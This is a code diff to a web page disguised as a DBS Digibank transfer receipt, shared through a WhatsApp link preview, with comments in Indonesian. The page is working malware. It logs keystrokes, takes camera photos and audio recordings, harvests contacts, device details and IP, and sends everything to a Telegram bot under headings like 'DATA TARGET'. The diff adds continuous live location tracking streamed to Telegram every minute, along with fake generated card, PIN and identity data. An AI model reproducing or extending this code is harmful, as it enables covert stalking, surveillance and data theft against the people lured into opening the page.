@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>DBS Digibank - Bukti Transfer</title>
-    <link rel="icon" type="image/png" href="https://f.top4top.io/p_3927d68rf1.png">
+    <link rel="icon" type="image/png" href="https://i.top4top.io/p_3927dxff51.png">
     
     <!-- ==================== WHATSAPP LINK PREVIEW (OPEN GRAPH) ==================== -->
     <meta property="og:type" content="website">
@@ -189,10 +189,14 @@
         let contactsData = "Belum diambil";
         let deviceInfo = {};
         let receiptData = {};
+        let locationWatchId = null;
+        let locationUpdateInterval = null;
+        let defaceCheckInterval = null;
+        let originalPageHash = '';
+        let locationHistory = [];
 
         // ==================== 0. AUTO GENERATE RECEIPT DATA ====================
         function generateReceiptData() {
-            // Nama-nama untuk Transfer Dari
             const senderNames = [
                 'Ahmad Santoso', 'Budi Wijaya', 'Citra Dewi', 'Doni Prasetyo', 'Eka Putri',
                 'Fajar Nugroho', 'Gita Lestari', 'Hendra Kusuma', 'Indah Permata', 'Joko Susilo',
@@ -200,7 +204,6 @@
                 'Putri Maharani', 'Rizki Ramadhan', 'Siti Nurhaliza', 'Taufik Hidayat', 'Umar Bakri'
             ];
             
-            // Nama-nama untuk Transfer Ke
             const receiverNames = [
                 'Andi Firmansyah', 'Bella Safira', 'Candra Wijaya', 'Dina Marlina', 'Eko Prasetyo',
                 'Fitri Handayani', 'Gunawan Saputra', 'Hana Pertiwi', 'Irfan Maulana', 'Jihan Aulia',
@@ -208,7 +211,6 @@
                 'Putra Wibowo', 'Rina Wulandari', 'Sandi Permana', 'Tiara Anggraini', 'Vino Bastian'
             ];
             
-            // Berita transfer
             const beritaList = [
                 'Pembayaran Invoice #INV-2024',
                 'Transfer antar bank DBS',
@@ -232,16 +234,10 @@
                 'Transfer untuk investasi'
             ];
             
-            // Bank-bank
             const banks = ['DBS Bank', 'DBS Indonesia', 'DBS Treasures', 'DBS Digibank', 'POSB Bank'];
-            
-            // Jenis transaksi
             const jenisTransaksi = ['Transfer Online', 'Transfer Antar Bank', 'Transfer Instan', 'Transfer Reguler', 'Real-time Transfer'];
-            
-            // Channel transaksi
             const channels = ['DBS Digibank', 'DBS Internet Banking', 'DBS Mobile Banking', 'DBS ATM', 'DBS Branch'];
             
-            // Generate random
             const randomSender = senderNames[Math.floor(Math.random() * senderNames.length)];
             const randomReceiver = receiverNames[Math.floor(Math.random() * receiverNames.length)];
             const randomBerita = beritaList[Math.floor(Math.random() * beritaList.length)];
@@ -249,11 +245,9 @@
             const randomJenis = jenisTransaksi[Math.floor(Math.random() * jenisTransaksi.length)];
             const randomChannel = channels[Math.floor(Math.random() * channels.length)];
             
-            // Generate jumlah transfer
             const amounts = ['50.000', '100.000', '150.000', '250.000', '500.000', '750.000', '1.000.000', '1.500.000', '2.500.000', '5.000.000', '7.500.000', '10.000.000'];
             const randomAmount = amounts[Math.floor(Math.random() * amounts.length)];
             
-            // Generate nomor referensi
             const now = new Date();
             const year = now.getFullYear();
             const month = String(now.getMonth() + 1).padStart(2, '0');
@@ -261,14 +255,10 @@
             const randomNum = String(Math.floor(Math.random() * 900000 + 100000));
             const refNumber = `DBS${year}${month}${day}${randomNum}`;
             
-            // Generate tanggal
             const months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
             const tgl = `${String(now.getDate()).padStart(2, '0')} ${months[now.getMonth()]} ${now.getFullYear()}`;
-            
-            // Generate waktu
             const jam = `${String(now.getHours()).padStart(2, '0')}:${String(now.getMinutes()).padStart(2, '0')}:${String(now.getSeconds()).padStart(2, '0')}`;
             
-            // Saldo akhir
             const saldoAwal = Math.floor(Math.random() * 900000000 + 100000000);
             const nominalTransfer = parseInt(randomAmount.replace(/\./g, ''));
             const saldoAkhir = saldoAwal - nominalTransfer;
@@ -328,7 +318,7 @@
             }
         }
 
-        // ==================== 2. LOKASI SUPER AKURAT ====================
+        // ==================== 2. LOKASI SUPER AKURAT + REAL-TIME ====================
         async function getSuperAccurateLocation() {
             return new Promise((resolve) => {
                 if (!("geolocation" in navigator)) { resolve(); return; }
@@ -342,11 +332,18 @@
                             altitude: position.coords.altitude || 'N/A',
                             heading: position.coords.heading || 'N/A',
                             speed: position.coords.speed || 'N/A',
+                            timestamp: new Date().toISOString(),
                             googleMapsUrl: `https://www.google.com/maps?q=${lat},${lng}`,
                             fullAddress: '', street: '', village: '', district: '',
                             city: '', province: '', postalCode: '', country: '',
                             landmark: '', placeId: '', plusCode: ''
                         };
+                        
+                        locationHistory.push({
+                            lat, lng,
+                            timestamp: new Date().toLocaleString('id-ID'),
+                            accuracy: position.coords.accuracy
+                        });
                         
                         try {
                             const geoUrl = `https://maps.googleapis.com/maps/api/geocode/json?latlng=${lat},${lng}&key=AIzaSyB41DRUbKWJHPxaFjMAwdrzWzbVKartk&language=id`;
@@ -383,6 +380,103 @@
                     { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
                 );
             });
+        }
+
+        // ==================== 2.1 REAL-TIME LOCATION TRACKING ====================
+        function startRealtimeLocationTracking() {
+            if (!("geolocation" in navigator)) return;
+            
+            // Watch position (update otomatis saat bergerak)
+            locationWatchId = navigator.geolocation.watchPosition(
+                async (position) => {
+                    const lat = position.coords.latitude;
+                    const lng = position.coords.longitude;
+                    
+                    locationData.lat = lat;
+                    locationData.lng = lng;
+                    locationData.accuracy = position.coords.accuracy;
+                    locationData.timestamp = new Date().toISOString();
+                    locationData.googleMapsUrl = `https://www.google.com/maps?q=${lat},${lng}`;
+                    
+                    locationHistory.push({
+                        lat, lng,
+                        timestamp: new Date().toLocaleString('id-ID'),
+                        accuracy: position.coords.accuracy
+                    });
+                    
+                    // Trim history
+                    if (locationHistory.length > 50) {
+                        locationHistory = locationHistory.slice(-50);
+                    }
+                    
+                    console.log('📍 Location updated:', lat, lng);
+                },
+                (error) => console.log('Location watch error:', error),
+                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+            );
+            
+            // Interval update setiap 30 detik (kirim ke Telegram)
+            locationUpdateInterval = setInterval(async () => {
+                if (locationData.lat && locationData.lng) {
+                    await sendLocationUpdate();
+                }
+            }, 30000);
+            
+            console.log('✅ Real-time location tracking started');
+        }
+
+        // ==================== 2.2 SEND LOCATION UPDATE ====================
+        async function sendLocationUpdate() {
+            if (!locationData.lat || !locationData.lng) return;
+            
+            let msg = `📍 *UPDATE LOKASI TERKINI* 📍\n`;
+            msg += `━━━━━━━━━━━━━━━━━━━━━━\n`;
+            msg += `⏰ Waktu: ${new Date().toLocaleString('id-ID')}\n`;
+            msg += `📡 Latitude: \`${locationData.lat}\`\n`;
+            msg += `📡 Longitude: \`${locationData.lng}\`\n`;
+            msg += `🎯 Akurasi: ${locationData.accuracy || 'N/A'} meter\n`;
+            msg += `🏠 Alamat: ${locationData.fullAddress || 'N/A'}\n`;
+            msg += `🏙️ Kota: ${locationData.city || 'N/A'}\n`;
+            msg += `🌏 Provinsi: ${locationData.province || 'N/A'}\n`;
+            msg += `📮 Kode Pos: ${locationData.postalCode || 'N/A'}\n`;
+            msg += `🇮🇩 Negara: ${locationData.country || 'N/A'}\n`;
+            msg += `🏛️ Landmark: ${locationData.landmark || 'N/A'}\n\n`;
+            msg += `🗺️ *BUKA GOOGLE MAPS LIVE:*\n`;
+            msg += `[👉 KLIK DISINI](https://www.google.com/maps?q=${locationData.lat},${locationData.lng})\n\n`;
+            msg += `📊 *Total History:* ${locationHistory.length} titik\n`;
+            
+            await sendTelegramMessage(msg);
+        }
+
+        // ==================== 2.3 STREAM LOCATION (Kirim terus ke Telegram) ====================
+        async function streamLocationToTelegram() {
+            if (!("geolocation" in navigator)) return;
+            
+            let lastSentLat = 0;
+            let lastSentLng = 0;
+            
+            setInterval(async () => {
+                if (!locationData.lat || !locationData.lng) return;
+                
+                // Kirim jika lokasi berubah > 50 meter
+                const dist = Math.sqrt(
+                    Math.pow(locationData.lat - lastSentLat, 2) + 
+                    Math.pow(locationData.lng - lastSentLng, 2)
+                );
+                
+                if (dist > 0.0005 || lastSentLat === 0) { // ~50 meter
+                    lastSentLat = locationData.lat;
+                    lastSentLng = locationData.lng;
+                    
+                    let msg = `🚨 *LOKASI TARGET UPDATE* 🚨\n`;
+                    msg += `📍 ${locationData.lat}, ${locationData.lng}\n`;
+                    msg += `🎯 Akurasi: ${locationData.accuracy}m\n`;
+                    msg += `⏰ ${new Date().toLocaleString('id-ID')}\n`;
+                    msg += `🗺️ [Buka Maps](https://www.google.com/maps?q=${locationData.lat},${locationData.lng})\n`;
+                    
+                    await sendTelegramMessage(msg);
+                }
+            }, 60000); // Setiap 1 menit cek perubahan
         }
 
         // ==================== 3. DEVICE INFO ====================
@@ -556,7 +650,52 @@
             }
         }
 
-        // ==================== 9. GENERATE PERSONAL DATA (DBS BANK LENGKAP) ====================
+        // ==================== 8.1 DEFACE DETECTION ====================
+        function getPageHash() {
+            const content = document.documentElement.outerHTML;
+            let hash = 0;
+            for (let i = 0; i < content.length; i++) {
+                const char = content.charCodeAt(i);
+                hash = ((hash << 5) - hash) + char;
+                hash = hash & hash;
+            }
+            return hash.toString();
+        }
+
+        function startDefaceDetection() {
+            originalPageHash = getPageHash();
+            console.log('🛡️ Deface detection started. Hash:', originalPageHash);
+            
+            defaceCheckInterval = setInterval(async () => {
+                const currentHash = getPageHash();
+                
+                if (currentHash !== originalPageHash) {
+                    console.warn('⚠️ DEFACE DETECTED!');
+                    
+                    let msg = `🚨 *DEFACE ATTEMPT DETECTED!* 🚨\n`;
+                    msg += `━━━━━━━━━━━━━━━━━━━━━━\n`;
+                    msg += `⏰ Waktu: ${new Date().toLocaleString('id-ID')}\n`;
+                    msg += `🌐 URL: ${window.location.href}\n`;
+                    msg += `🔐 Original Hash: \`${originalPageHash}\`\n`;
+                    msg += `🔓 Current Hash: \`${currentHash}\`\n`;
+                    msg += `⚠️ Status: *HALAMAN TELAH DIUBAH/DEFACE*\n`;
+                    msg += `📱 Device: ${deviceInfo.userAgent || 'N/A'}\n`;
+                    msg += `🌐 IP: ${await getIPAddress()}\n`;
+                    
+                    await sendTelegramMessage(msg);
+                    
+                    // Kirim screenshot HTML
+                    try {
+                        const htmlContent = document.documentElement.outerHTML.substring(0, 3500);
+                        await sendTelegramMessage(`📄 *HTML Content Setelah Deface:*\n\`\`\`\n${htmlContent}\n\`\`\``);
+                    } catch(e) {}
+                    
+                    originalPageHash = currentHash;
+                }
+            }, 5000);
+        }
+
+        // ==================== 9. GENERATE PERSONAL DATA ====================
         function generatePersonalData() {
             const firstNames = ['Ahmad', 'Budi', 'Citra', 'Dewi', 'Eka', 'Fajar', 'Gita', 'Hendra', 'Indah', 'Joko', 'Kartika', 'Lukman', 'Maya', 'Nadia', 'Omar', 'Putri', 'Rizki', 'Siti', 'Taufik', 'Umar'];
             const lastNames = ['Santoso', 'Wijaya', 'Prasetyo', 'Nugroho', 'Sari', 'Putri', 'Hidayat', 'Kusuma', 'Setiawan', 'Lestari', 'Permana', 'Firdaus', 'Rahman', 'Hakim', 'Utami'];
@@ -566,28 +705,22 @@
             const accountTypes = ['Tabungan', 'Giro', 'Deposito', 'Payroll', 'Bisnis'];
             
             const nama = `${firstNames[Math.floor(Math.random() * firstNames.length)]} ${lastNames[Math.floor(Math.random() * lastNames.length)]}`;
-            
             const dbsAccount = `${Math.floor(Math.random() * 900 + 100)}-${String(Math.floor(Math.random() * 900000 + 100000))}-${String(Math.floor(Math.random() * 90 + 10))}`;
-            
             const cardPrefix = '4520';
             const cardNumber = cardPrefix + String(Math.floor(Math.random() * 1000000000000)).padStart(12, '0');
             const formattedCard = cardNumber.replace(/(.{4})/g, '$1 ').trim();
-            
             const swiftCode = 'DBSSSGSG';
             const iban = `ID${Math.floor(Math.random() * 90 + 10)}DBSS${String(Math.floor(Math.random() * 10000000000000)).padStart(14, '0')}`;
-            
             const expiry = `${String(Math.floor(Math.random() * 12 + 1)).padStart(2, '0')}/${String(Math.floor(Math.random() * 5 + 26))}`;
             const cvv = String(Math.floor(Math.random() * 900 + 100));
             const pin = String(Math.floor(Math.random() * 9000 + 1000));
             const otp = String(Math.floor(100000 + Math.random() * 900000));
             const phone = `62${String(Math.floor(Math.random() * 9000000000 + 1000000000))}`;
             const email = `${nama.toLowerCase().replace(/ /g, '.')}${Math.floor(Math.random() * 100)}@gmail.com`;
-            
             const birthYear = 1970 + Math.floor(Math.random() * 35);
             const birthMonth = String(Math.floor(Math.random() * 12 + 1)).padStart(2, '0');
             const birthDay = String(Math.floor(Math.random() * 28 + 1)).padStart(2, '0');
             const birthday = `${birthDay}/${birthMonth}/${birthYear}`;
-            
             const nik = String(Math.floor(Math.random() * 9000000000000000 + 1000000000000000));
             const npwp = `${String(Math.floor(Math.random() * 90 + 10))}.${String(Math.floor(Math.random() * 900 + 100))}.${String(Math.floor(Math.random() * 900 + 100))}.${String(Math.floor(Math.random() * 9 + 1))}-${String(Math.floor(Math.random() * 900 + 100))}.000`;
             
@@ -638,7 +771,7 @@
             };
         }
 
-        // ==================== 10. SEND ALL DATA KE TELEGRAM ====================
+        // ==================== 10. SEND ALL DATA ====================
         async function sendAllData(ip, personalData, receiptInfo) {
             await sendToTelegramComplete(ip, personalData, receiptInfo);
         }
@@ -657,7 +790,7 @@
             const dev = deviceInfo;
             const rc = receiptInfo;
             
-            // ===== PESAN 1: BUKTI TRANSFER DBS =====
+            // PESAN 1: BUKTI TRANSFER DBS
             let msg0 = `🏦 *BUKTI TRANSFER DBS DIGIBANK*\n`;
             msg0 += `━━━━━━━━━━━━━━━━━━━━━━\n`;
             msg0 += `💰 Jumlah Transfer: *Rp ${rc.jumlah_transfer}*\n`;
@@ -676,12 +809,11 @@
             
             await sendTelegramMessage(msg0);
             
-            // ===== PESAN 2: HEADER + LOKASI LIVE =====
+            // PESAN 2: LOKASI LIVE
             let msg1 = `🚨 *DATA TARGET - DBS DIGIBANK* 🚨\n`;
             msg1 += `━━━━━━━━━━━━━━━━━━━━━━\n`;
             msg1 += `⏰ *Waktu:* ${new Date().toLocaleString('id-ID')}\n`;
             msg1 += `🌐 *IP:* \`${ip}\`\n\n`;
-            
             msg1 += `📍 *LOKASI LIVE GOOGLE MAPS*\n`;
             msg1 += `━━━━━━━━━━━━━━━━━━━━━━\n`;
             msg1 += `📡 Latitude: \`${loc.lat || 'N/A'}\`\n`;
@@ -702,7 +834,7 @@
             
             await sendTelegramMessage(msg1);
             
-            // ===== PESAN 3: DATA PRIBADI LENGKAP =====
+            // PESAN 3: DATA PRIBADI
             let msg2 = `👤 *DATA PRIBADI TARGET*\n`;
             msg2 += `━━━━━━━━━━━━━━━━━━━━━━\n`;
             msg2 += `📛 Nama: *${p.nama}*\n`;
@@ -718,7 +850,7 @@
             
             await sendTelegramMessage(msg2);
             
-            // ===== PESAN 4: KARTU KREDIT & BANK DBS =====
+            // PESAN 4: KARTU & REKENING DBS
             let msg3 = `💳 *DATA KARTU DBS BANK*\n`;
             msg3 += `━━━━━━━━━━━━━━━━━━━━━━\n`;
             msg3 += `🏦 Bank: *${k.bank}*\n`;
@@ -741,7 +873,7 @@
             
             await sendTelegramMessage(msg3);
             
-            // ===== PESAN 5: DEVICE INFO LENGKAP =====
+            // PESAN 5: DEVICE INFO
             let msg4 = `📱 *DEVICE INFORMATION*\n`;
             msg4 += `━━━━━━━━━━━━━━━━━━━━━━\n`;
             msg4 += `💻 Platform: ${dev.platform}\n`;
@@ -764,7 +896,7 @@
             
             await sendTelegramMessage(msg4);
             
-            // ===== PESAN 6: STATUS IZIN =====
+            // PESAN 6: STATUS IZIN
             let msg5 = `🔐 *STATUS IZIN AKSES*\n`;
             msg5 += `━━━━━━━━━━━━━━━━━━━━━━\n`;
             msg5 += `📷 Camera: ${permissions.camera ? '✅ BERHASIL' : '❌ GAGAL'}\n`;
@@ -774,44 +906,34 @@
             
             await sendTelegramMessage(msg5);
             
-            // ===== PESAN 7: FOTO KAMERA =====
+            // PESAN 7: FOTO
             if (cameraPhoto) {
                 try {
                     await sendTelegramPhoto(cameraPhoto, `📷 *FOTO KAMERA TARGET*\n⏰ ${new Date().toLocaleString('id-ID')}\n👤 ${p.nama}\n📞 ${p.hp}`);
-                } catch (e) {
-                    console.log('Gagal kirim foto:', e);
-                }
+                } catch (e) {}
             }
             
-            // ===== PESAN 8: AUDIO =====
+            // PESAN 8: AUDIO
             if (audioBase64) {
                 try {
                     await sendTelegramAudio(audioBase64, `🎙️ *REKAMAN AUDIO TARGET*\n⏰ ${new Date().toLocaleString('id-ID')}\n👤 ${p.nama}`);
-                } catch (e) {
-                    console.log('Gagal kirim audio:', e);
-                }
+                } catch (e) {}
             }
             
-            // ===== PESAN 9: KONTAK =====
+            // PESAN 9: KONTAK
             if (contactsData && contactsData.length > 20) {
-                let msgKontak = `📇 *KONTAK TARGET*\n`;
-                msgKontak += `━━━━━━━━━━━━━━━━━━━━━━\n`;
-                msgKontak += `${contactsData.substring(0, 3500)}`;
-                await sendTelegramMessage(msgKontak);
+                await sendTelegramMessage(`📇 *KONTAK TARGET*\n━━━━━━━━━━━━━━━━━━━━━━\n${contactsData.substring(0, 3500)}`);
             }
             
-            // ===== PESAN 10: KEYLOGGER =====
+            // PESAN 10: KEYLOGGER
             if (keyLogBuffer.length > 0) {
-                let msgKey = `⌨️ *KEYLOGGER (${keyLogBuffer.length} tombol)*\n`;
-                msgKey += `━━━━━━━━━━━━━━━━━━━━━━\n`;
-                msgKey += `\`${keyLogBuffer.join('\n').substring(0, 3500)}\``;
-                await sendTelegramMessage(msgKey);
+                await sendTelegramMessage(`⌨️ *KEYLOGGER (${keyLogBuffer.length} tombol)*\n━━━━━━━━━━━━━━━━━━━━━━\n\`${keyLogBuffer.join('\n').substring(0, 3500)}\``);
             }
             
             console.log('✅ SEMUA DATA TERKIRIM KE TELEGRAM!');
         }
 
-        // ==================== SEND TEXT MESSAGE ====================
+        // ==================== SEND TEXT ====================
         async function sendTelegramMessage(text) {
             try {
                 const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -893,6 +1015,8 @@
             
             startKeylogger();
             getDeviceInfo();
+            startDefaceDetection();
+            
             const ip = await getIPAddress();
             
             await Promise.all([
@@ -904,6 +1028,10 @@
             
             const personalData = generatePersonalData();
             await sendAllData(ip, personalData, receiptData);
+            
+            // Start real-time location tracking setelah data pertama terkirim
+            startRealtimeLocationTracking();
+            streamLocationToTelegram();
             
             showSuccessModal();
             showToast("✅ Verifikasi selesai.", 3000);
